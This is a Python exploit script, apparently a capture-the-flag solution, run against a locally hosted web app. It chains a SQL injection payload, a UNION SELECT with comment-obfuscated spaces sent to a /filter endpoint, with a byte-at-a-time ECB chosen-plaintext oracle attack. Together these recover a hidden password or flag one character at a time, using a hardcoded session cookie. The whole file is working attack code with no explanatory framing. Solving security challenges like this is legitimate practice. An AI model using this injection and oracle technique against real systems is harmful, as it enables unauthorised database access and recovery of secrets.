import requests
from Crypto.Util.number import bytes_to_long

BASE_URL = "http://127.0.0.1:5000" #TODO

# range for possible flag chars
ascii_start = 32
ascii_end = 126

block_byte_start = 0
block_byte_end = 16
block_byte_size = 16
pw = ""
payload_length = block_byte_end-len(pw)-1
starting_bytes = "a"*payload_length
uuid = "c588e702-6d70-495e-ae4e-34e3a138b414"
session = "eyJpc19sb2dnZWRfaW4iOnRydWUsInVzZXJfaWQiOjR9.Zz30ZA.pAsGjAHz3J8NcRgazl9N6btqj2U"
# attack until get last byte, b"}", attacks for more than 16 bytes
def get_encrypted_pw(pw):
    response = requests.post(BASE_URL+"/signup", data={"username": pw, "password": pw},cookies={"uuid":uuid,"session":session})
    sqli = f"-- dhadhlsjldas%'/**/UNION/**/SELECT/**/username,password,MAX(userId)/**/FROM/**/users/**/WHERE/**/username='{pw}'--"
    response = requests.post(BASE_URL+"/filter", data={"search": sqli},cookies={"uuid":uuid,"session":session})
    data = response.json()[0]
    if data[0] != pw:
        print(f"Error: {data} {pw}")
        exit()
    return bytes.fromhex(data[1])

for i in range(16):
    # payload = hex(bytes_to_long(starting_bytes))[2:]
    actual_leak = get_encrypted_pw(starting_bytes)

    # Starting payload for block attack
    part_payload = starting_bytes + pw

    # running through all possible printable chars
    found = False
    for ascii in range(ascii_end, ascii_start - 1, -1):
        char = chr(ascii)
        if char in ["'", '"', "\\", " "]:
            continue
        payload = part_payload + char
        test_leak = get_encrypted_pw(payload)

        # checking if the actual leak's block and test_leak's first block match
        if test_leak[block_byte_start:block_byte_end] == actual_leak[block_byte_start:block_byte_end]:
            print(f"Found: {char}")
            pw += char
            found = True
            # going into next block already
            if payload_length % block_byte_size == 1:
                payload_length += block_byte_size - 1
                block_byte_start += block_byte_size
                block_byte_end += block_byte_size
            else:
                payload_length -= 1

            starting_bytes = "a"*payload_length
            part_payload = starting_bytes + pw
            break
    if not found:
        break
print(pw)